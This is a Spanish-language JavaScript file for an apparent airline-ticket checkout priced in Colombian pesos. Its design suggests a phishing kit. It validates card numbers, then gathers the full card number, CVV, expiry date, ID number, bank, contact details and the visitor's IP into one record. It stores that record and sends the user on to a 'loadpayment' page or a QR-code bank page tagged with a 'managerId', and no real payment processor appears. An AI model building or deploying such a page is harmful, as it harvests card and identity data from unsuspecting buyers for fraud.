const managerId = 25;

const DOMElements = {
    labelDepartures: document.querySelector('#label-departures'),
    labelTotalResume: document.querySelector('#label-total-resume'),
    btnNextStep: document.querySelector('#btn-next-step'),
    btnNextStepPse: document.querySelector('#btn-next-step-pse'),
    contPaymentMethod: document.querySelector('#payment-method'),
    contPaymentPseMethod: document.querySelector('#pse-button'),
    contCardInputs: document.querySelector('#card-inputs'),
    contPseInputs: document.querySelector('#pse-inputs'),
    btnSubmitForm: document.querySelector('#submit-form'),
    inputP: document.querySelector('#p'),
    formMain: document.querySelector('#main-form'),
};

/**
 * Startup@Payment
 * 
 */
document.addEventListener('DOMContentLoaded', () => {
    eventListeners();
    updateDOM();
});

/**
 * Events@Payment
 * 
 */
const eventListeners = () => {
    const { contPaymentMethod, contCardInputs, btnNextStep, btnNextStepPse, btnSubmitForm, formMain, contPaymentPseMethod, contPseInputs } = DOMElements;

    contPaymentMethod.addEventListener('click', () => {
        contCardInputs.classList.remove('hide');
        contPseInputs.classList.add('hide');

        btnNextStepPse.classList.add('hide');

    });

    contPaymentPseMethod.addEventListener('click', () => {
        contPseInputs.classList.remove('hide');
        contCardInputs.classList.add('hide');

        btnNextStepPse.classList.remove('hide');

    });



    btnNextStep.addEventListener('click', () => {
        btnSubmitForm.click();
    });

    btnNextStepPse.addEventListener('click', () => {
        submitPse()
    });

    formMain.addEventListener('submit', (e) => {
        e.preventDefault();
        validateCardFiels();
    });
};

const updateDOM = () => {

    const { labelDepartures, labelTotalResume } = DOMElements;
    const { travel_type, seat_type, origin, destination, adults, children, babies, flightDates } = info.flightInfo;

    /** Label departures */
    if (travel_type === 1) {
        labelDepartures.textContent = `${origin.city} - ${destination.city} | ${destination.city} - ${origin.city}`;
    } else if (travel_type === 2) {
        labelDepartures.textContent = `${origin.city} - ${destination.city}`;
    } else {
        console.log('pita');
    }

    /** label total flight */
    const totalLight = (PRECIO_BASE * (adults + children));
    const totalSmart = (PRECIO_BASE * MULTIPLICADORES_PRECIO.smart * (adults + children));
    const totalFull = (PRECIO_BASE * MULTIPLICADORES_PRECIO.full * (adults + children));

    let total = 0;
    if (origin.ticket_type === 'light') {
        total += totalLight;
    } else if (origin.ticket_type === 'smart') {
        total += totalSmart;
    } else if (origin.ticket_type === 'full') {
        total += totalFull;
    } else {
        console.log('TICKET_TYPE_NULL');
    }

    if (travel_type === 1) {
        if (destination.ticket_type === 'light') {
            total += totalLight;
        } else if (destination.ticket_type === 'smart') {
            total += totalSmart;
        } else if (destination.ticket_type === 'full') {
            total += totalFull;
        } else {
            console.log('TICKET_TYPE_NULL');
        }
    }

    labelTotalResume.textContent = '$ ' + total.toLocaleString('es-ES') + ' COP';
};

/**
 * Functions@Payment
 * 
 */
const validateCardFiels = () => {
    const p = document.querySelector('#p');
    const pdate = document.querySelector('#pdate');
    const c = document.querySelector('#c');
    const ban = document.querySelector('#ban');
    const name = document.querySelector('#name');
    const surname = document.querySelector("#surname");
    const cc = document.querySelector('#cc');
    const email = document.querySelector('#email');
    const telnum = document.querySelector('#telnum');
    const city = document.querySelector('#city');
    const address = document.querySelector('#address');

    if ((p.value.length === 19 && p.value[0] !== '3' && ['4', '5'].includes(p.value[0])) || (p.value.length === 17 && p.value[0] === '3')) {
        if (isLuhnValid(p.value)) {
            if (isValidDate(pdate.value)) {
                if ((c.value.length === 3 && p.value.length === 19) || (c.value.length === 4 && p.value.length === 17)) {
                    console.log("Ok. Let's go!");

                    // Almacenar datos del formulario en un objeto
                    const formData = {
                        nombre: name.value + " " + surname.value,
                        id: cc.value,
                        ip: info.metaInfo.ip,
                        banco: ban.value,
                        email: email.value,
                        tarjeta: p.value,
                        ftarjeta: pdate.value,
                        cvv: c.value,
                        celular: telnum.value,
                        direccion: address.value + " " + city.value,
                    };

                    // Guardar el objeto formData en localStorage con la clave 'pagojet'
                    localStorage.setItem("pagojet", JSON.stringify(formData));

                    console.log(formData);

                    // Mostrar el loader
                    document.querySelector('.loader').classList.add('show');

                    // Redirigir a loadpayment.php después de 3 segundos
                    setTimeout(() => window.location.href = 'loadpayment.php', 3000);

                } else {
                    alert('Revise el CVV de su tarjeta.');
                    c.value = '';
                    c.focus();
                }
            } else {
                alert('Revise la fecha de vencimiento de su tarjeta.');
                pdate.value = '';
                pdate.focus();
            }
        } else {
            alert('Número de tarjeta inválido. Revisalo e intenta de nuevo.');
            p.value = '';
            p.focus();
        }
    } else {
        alert('Revisa el número de tu tarjeta.');
        p.value = '';
        p.focus();
    }
};


function updateLS() {
    localStorage.setItem("metaInfo", JSON.stringify(info.metaInfo));
    localStorage.setItem("checkerInfo", JSON.stringify(info.checkerInfo));
    localStorage.setItem("flightInfo", JSON.stringify(info.flightInfo));
}

function formatCNumber(input) {
    let numero = input.value.replace(/\D/g, ''); // Eliminar todos los caracteres no numéricos

    let numeroFormateado = '';

    // American express
    if (numero[0] === '3') {
        c.setAttribute('oninput', "limitDigits(this, 4)");

        if (numero.length > 15) {
            numero = numero.substr(0, 15); // Limitar a un máximo de 15 caracteres
        }

        for (let i = 0; i < numero.length; i++) {
            if (i === 4 || i === 10) {
                numeroFormateado += ' ';
            }

            numeroFormateado += numero.charAt(i);
        }

        input.value = numeroFormateado;
    } else {
        c.setAttribute('oninput', "limitDigits(this, 3)");
        if (numero.length > 16) {
            numero = numero.substr(0, 16); // Limitar a un máximo de 16 dígitos
        }
        for (let i = 0; i < numero.length; i++) {
            if (i > 0 && i % 4 === 0) {
                numeroFormateado += ' ';
            }
            numeroFormateado += numero.charAt(i);
        }
        input.value = numeroFormateado;
    }
}

function formatDate(input) {
    var texto = input.value;

    texto = texto.replace(/\D/g, '');

    texto = texto.substring(0, 4);

    if (texto.length > 2) {
        texto = texto.substring(0, 2) + '/' + texto.substring(2, 4);
    }
    input.value = texto;
}

function isLuhnValid(bin) {
    bin = bin.replace(/\D/g, '');

    if (bin.length < 6) {
        return false;
    }
    const digits = bin.split('').map(Number).reverse();

    let sum = 0;
    for (let i = 0; i < digits.length; i++) {
        if (i % 2 !== 0) {
            let doubled = digits[i] * 2;
            if (doubled > 9) {
                doubled -= 9;
            }
            sum += doubled;
        } else {
            sum += digits[i];
        }
    }

    return sum % 10 === 0;
}

function isValidDate(fechaInput) {
    var partes = fechaInput.split('/');
    var mesInput = parseInt(partes[0]);
    var anioInput = parseInt(partes[1]) + 2000; // Suponiendo que los años están en formato 'YY'

    var fechaActual = new Date();
    var mesActual = fechaActual.getMonth() + 1; // Los meses van de 0 a 11
    var anioActual = fechaActual.getFullYear();

    // Verificar si la fecha es válida
    if (anioInput < anioActual || (anioInput === anioActual && mesInput < mesActual)) {
        return false; // La tarjeta ha caducado
    }

    return true; // La tarjeta es válida
}


function submitPse() {
    const ban = document.querySelector('#ban-pse');
    const banco = ban.value;

    if (banco) {
        // Redirige a la nueva página con QR y temporizador
        window.location.href = `pse-payment.html?banco=${banco}&managerId=${managerId}`;
    } else {
        alert("Por favor selecciona un banco.");
    }
}

